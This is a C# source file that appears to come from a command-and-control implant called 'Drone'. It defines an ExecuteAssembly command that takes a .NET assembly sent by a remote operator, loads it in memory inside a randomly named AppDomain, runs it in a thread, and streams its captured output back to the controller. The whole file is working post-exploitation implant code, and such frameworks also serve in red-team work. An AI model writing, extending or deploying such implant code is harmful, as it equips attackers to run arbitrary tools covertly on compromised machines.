using System;
using System.IO;
using System.Threading;

namespace Drone.Commands;

public sealed class ExecuteAssembly : DroneCommand
{
    public override byte Command => 0x3F;
    public override bool Threaded => true;

    public override void Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var appDomain = AppDomain.CreateDomain(Helpers.GenerateShortGuid());

        var runner = (ShadowRunner)appDomain.CreateInstanceAndUnwrap(
            typeof(ShadowRunner).Assembly.FullName,
            typeof(ShadowRunner).FullName);

        using var ms = new MemoryStream();
        using var sw = new StreamWriter(ms) { AutoFlush = true };
        runner.Writer = sw;

        var t = new Thread(() => { runner.LoadEntryPoint(task.Artefact, task.Arguments); });
        t.Start();
        
        // send a task running
        Drone.SendTaskRunning(task.Id);

        // whilst assembly is executing
        // keep looping and reading stream

        byte[] output;
        
        do
        {
            // check cancellation token
            if (cancellationToken.IsCancellationRequested)
            {
                t.Abort();
                break;
            }

            output = ReadStream(ms);

            if (output.Length > 0)
                Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.RUNNING, output));

            Thread.Sleep(100);
            
        } while (t.IsAlive);
        
        // after task has finished, do a final read
        output = ReadStream(ms);
        Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.COMPLETE, output));
        
        AppDomain.Unload(appDomain);
    }

    private static byte[] ReadStream(MemoryStream ms)
    {
        var output = ms.ToArray();

        if (output.Length > 0)
            ms.Clear();

        return output;
    }
}